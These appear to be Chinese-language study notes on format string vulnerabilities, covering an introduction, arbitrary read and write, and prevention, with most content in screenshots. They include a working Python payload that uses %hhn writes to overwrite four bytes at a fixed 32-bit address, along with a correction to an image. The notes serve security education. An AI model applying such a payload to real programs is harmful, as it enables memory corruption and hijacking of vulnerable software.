# 一、格式化字符串漏洞介绍

![image-20260212211413486](./assets/image-20260212211413486.png)

![image-20260212211514256](./assets/image-20260212211514256.png)

![image-20260212211614948](./assets/image-20260212211614948.png)

![image-20260212212216461](./assets/image-20260212212216461.png)

# 二、格式化字符串漏洞的利用方法

## 任意地址读

![image-20260212213448397](./assets/image-20260212213448397.png)

![image-20260212213854633](./assets/image-20260212213854633.png)

## 任意地址写

![image-20260212214807307](./assets/image-20260212214807307.png)

**上面图片错误了，应该是\x10、\x11、\x12、\x13**

### 最终修正后的 Payload

Python

```
# 修正了地址的 \x00 为 \x10，并递增后续地址
payload = b""
payload += b"\x10\x80\x04\x08"  # 地址1 -> 存 0x40
payload += b"\x11\x80\x04\x08"  # 地址2 -> 存 0x30
payload += b"\x12\x80\x04\x08"  # 地址3 -> 存 0x20
payload += b"\x13\x80\x04\x08"  # 地址4 -> 存 0x10

# 计算逻辑保持不变
payload += b"%48c%7$hhn"
payload += b"%240c%8$hhn"
payload += b"%240c%9$hhn"
payload += b"%240c%10$hhn"
```

![image-20260212222029790](./assets/image-20260212222029790.png)

# 三、格式化字符串漏洞的防范

![image-20260213002812111](./assets/image-20260213002812111.png)

